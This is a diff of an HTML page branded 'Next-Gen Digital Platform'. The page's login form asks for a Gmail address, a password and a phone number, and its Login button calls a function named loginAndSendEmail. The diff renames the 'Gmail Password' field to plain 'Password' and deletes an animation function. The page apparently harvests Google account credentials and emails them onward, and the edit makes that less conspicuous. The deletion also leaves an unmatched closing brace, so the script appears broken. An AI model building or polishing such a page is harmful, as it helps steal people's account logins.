@@ -34,7 +34,7 @@ nav button:hover{background:rgba(0,200,255,0.4);}
     <div class="subtitle">Next-Gen Digital Platform</div>
     <form>
       <div class="input-group"><span class="icon">📧</span><input id="gmailInput" type="email" placeholder="Gmail"></div>
-      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Gmail Password"><span class="show" onclick="togglePassword()">👁</span></div>
+      <div class="input-group"><span class="icon">🔒</span><input id="passwordInput" type="password" placeholder="Password"><span class="show" onclick="togglePassword()">👁</span></div>
       <div class="input-group"><span class="icon">📱</span><input id="phoneInput" type="tel" placeholder="Phone Number"></div>
       <button type="button" onclick="loginAndSendEmail()">Login</button>
     </form>
@@ -211,23 +211,7 @@ function initCharts(){
   new Chart(pieCtx,{type:"pie",data:{labels:["Red","Blue","Green"],datasets:[{data:[10,20,30],backgroundColor:["#ff00ff","#00c6ff","#ff00ff"]}]},options:{responsive:true}});
 }
 
-// --- Logo Particles ---
-function formLogoParticles(){
-  const pos = geometry.attributes.position.array;
-  const target = [];
-  for(let i=0;i<particleCount;i++){
-    target.push(Math.cos(i/particleCount*Math.PI*4)*40);
-    target.push((Math.random()-0.5)*10);
-    target.push(Math.sin(i/particleCount*Math.PI*4)*10);
-  }
-  setInterval(()=>{
-    for(let i=0;i<particleCount;i++){
-      pos[i*3]+=(target[i*3]-pos[i*3])*0.02;
-      pos[i*3+1]+=(target[i*3+1]-pos[i*3+1])*0.02;
-      pos[i*3+2]+=(target[i*3+2]-pos[i*3+2])*0.02;
-    }
-    geometry.attributes.position.needsUpdate=true;
-  },16);
+
 }
 </script>
 </body>
